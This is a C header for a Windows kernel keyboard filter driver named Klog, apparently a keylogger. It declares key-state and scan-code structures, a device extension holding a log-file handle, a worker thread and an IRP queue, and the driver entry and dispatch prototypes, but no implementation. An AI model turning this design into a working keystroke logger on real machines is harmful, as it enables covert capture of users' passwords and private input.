#ifndef __Klog_h__
#define __Klog_h__

typedef BOOLEAN BOOL;

/////////////////////////
// STRUCTURES
////////////////////////
struct KEY_STATE 
{
	bool kSHIFT; //if the shift key is pressed 
	bool kCAPSLOCK; //if the caps lock key is pressed down
	bool kCTRL; //if the control key is pressed down
	bool kALT; //if the alt key is pressed down
};

//Instances of the structure will be chained onto a 
//linked list to keep track of the keyboard data
//delivered by each irp for a single pressed key
struct KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
};

typedef struct _DEVICE_EXTENSION 
{
	PDEVICE_OBJECT pKeyboardDevice; //pointer to next keyboard device on device stack
	PETHREAD pThreadObj;			//pointer to the worker thread
	bool bThreadTerminate;		    //thread terminiation state
	HANDLE hLogFile;				//handle to file to log keyboard output
	KEY_STATE kState;				//state of special keys like CTRL, SHIFT, ect

	//The work queue of IRP information for the keyboard scan codes is managed by this 
	//linked list, semaphore, and spin lock
	KSEMAPHORE semQueue;
	KSPIN_LOCK lockQueue;
	LIST_ENTRY QueueListHead;
}DEVICE_EXTENSION, *PDEVICE_EXTENSION;

//////////////////////////
// PROTOTYPES
//////////////////////////
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject, IN PUNICODE_STRING RegistryPath);
VOID Unload(IN PDRIVER_OBJECT DriverObject);
NTSTATUS DispatchPassDown(IN PDEVICE_OBJECT pDeviceObject, IN PIRP pIrp);

#endif			// __Klog_h__

